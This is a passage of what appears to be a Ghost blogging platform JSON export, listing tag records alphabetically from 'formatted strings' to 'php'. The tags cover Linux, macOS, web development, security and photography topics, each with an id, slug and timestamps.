strings","slug":"formatted-strings","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332686","name":"formatting","slug":"formatting","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332687","name":"Frank Curto Park","slug":"frank-curto-park","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332688","name":"free","slug":"free","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332689","name":"gconf","slug":"gconf","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133268a","name":"ghost","slug":"ghost-tag","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133268b","name":"girl","slug":"girl","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133268c","name":"gnome","slug":"gnome","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133268d","name":"gnome 3","slug":"gnome-3","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133268e","name":"gnome desktop","slug":"gnome-desktop","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133268f","name":"google","slug":"google","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332690","name":"google censorship","slug":"google-censorship","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332691","name":"gorhill","slug":"gorhill","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332692","name":"gpl","slug":"gpl","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332693","name":"green","slug":"green","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332694","name":"GUI","slug":"gui","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332695","name":"guide","slug":"guide","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332696","name":"gummiboot","slug":"gummiboot","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332697","name":"hacking","slug":"hacking","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332698","name":"hardware","slug":"hardware","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332699","name":"how-to","slug":"how-to","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133269a","name":"HTML","slug":"html","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133269b","name":"http","slug":"http","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133269c","name":"https","slug":"https","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133269d","name":"i3","slug":"i3","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133269e","name":"i3wm","slug":"i3wm","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133269f","name":"independent contracting","slug":"independent-contracting","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326a0","name":"installation","slug":"installation","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326a1","name":"instruction","slug":"instruction","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326a2","name":"internet security","slug":"internet-security","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326a3","name":"issues","slug":"issues","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326a4","name":"java","slug":"java","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326a5","name":"JavaScript","slug":"javascript","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326a6","name":"JQuery","slug":"jquery","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326a7","name":"JSX","slug":"jsx","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326a8","name":"keepass","slug":"keepass","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326a9","name":"kernel","slug":"kernel","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326aa","name":"key-based authentication","slug":"key-based-authentication","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326ab","name":"language","slug":"language","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326ac","name":"lastpass","slug":"lastpass","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326ad","name":"learning","slug":"learning","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326ae","name":"learning programming","slug":"learning-programming","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326af","name":"led","slug":"led","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326b0","name":"led strips","slug":"led-strips","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326b1","name":"LEMP","slug":"lemp","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326b2","name":"letsencrypt","slug":"letsencrypt","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326b3","name":"libre","slug":"libre","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326b4","name":"license agreement","slug":"license-agreement","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326b5","name":"light","slug":"light","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326b6","name":"linux","slug":"linux","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326b7","name":"list comprehension","slug":"list-comprehension","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326b8","name":"logs","slug":"logs","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326b9","name":"long exposure","slug":"long-exposure","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326ba","name":"mac","slug":"mac","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326bb","name":"mac os","slug":"mac-os","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326bc","name":"macbook","slug":"macbook","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326bd","name":"macbook pro","slug":"macbook-pro","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326be","name":"macbook pro 9 2","slug":"macbook-pro-9-2","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326bf","name":"macfanctld","slug":"macfanctld","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326c0","name":"macos","slug":"macos","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326c1","name":"make backups","slug":"make-backups","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326c2","name":"make faster","slug":"make-faster","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326c3","name":"malware","slug":"malware","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326c4","name":"manjaro","slug":"manjaro","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326c5","name":"manjaro architect","slug":"manjaro-architect","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326c6","name":"manmade","slug":"manmade","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326c7","name":"MariaDB","slug":"mariadb","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326c8","name":"media","slug":"media","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326c9","name":"memory","slug":"memory","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326ca","name":"metaphor","slug":"metaphor","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326cb","name":"Microsoft Edge","slug":"microsoft-edge","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326cc","name":"mid-2012","slug":"mid-2012","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326cd","name":"motorola","slug":"motorola","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326ce","name":"MySQL","slug":"mysql","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326cf","name":"mystery","slug":"mystery","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326d0","name":"national weather service","slug":"national-weather-service","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326d1","name":"natural","slug":"natural","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326d2","name":"natural language","slug":"natural-language","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326d3","name":"natural language processing","slug":"natural-language-processing","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326d4","name":"natural language programming","slug":"natural-language-programming","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326d5","name":"nature","slug":"nature","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326d6","name":"new","slug":"new","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326d7","name":"new feature","slug":"new-feature","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326d8","name":"nexus","slug":"nexus","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326d9","name":"nexus 6","slug":"nexus-6","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326da","name":"nginx","slug":"nginx","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326db","name":"night","slug":"night","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326dc","name":"nlp","slug":"nlp","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326dd","name":"no retina","slug":"no-retina","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326de","name":"node.js","slug":"node-js","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326df","name":"nws","slug":"nws","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326e0","name":"Oakland","slug":"oakland","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326e1","name":"office","slug":"office","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326e2","name":"office buildings","slug":"office-buildings","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326e3","name":"open","slug":"open","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326e4","name":"open source","slug":"open-source","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326e5","name":"openscad","slug":"openscad","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326e6","name":"opera","slug":"opera","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326e7","name":"opinion","slug":"opinion","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326e8","name":"osx","slug":"osx","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326e9","name":"Owncloud","slug":"owncloud","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326ea","name":"OwnCloud X","slug":"owncloud-x","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326eb","name":"parsing","slug":"parsing","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326ec","name":"password management","slug":"password-management","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326ed","name":"passwords","slug":"passwords","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326ee","name":"pc","slug":"pc","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326ef","name":"person","slug":"person","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326f0","name":"photography","slug":"photography","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326f1","name":"photos","slug":"photos","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326f2","name":"php","slug":"php","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326f3","name":"php 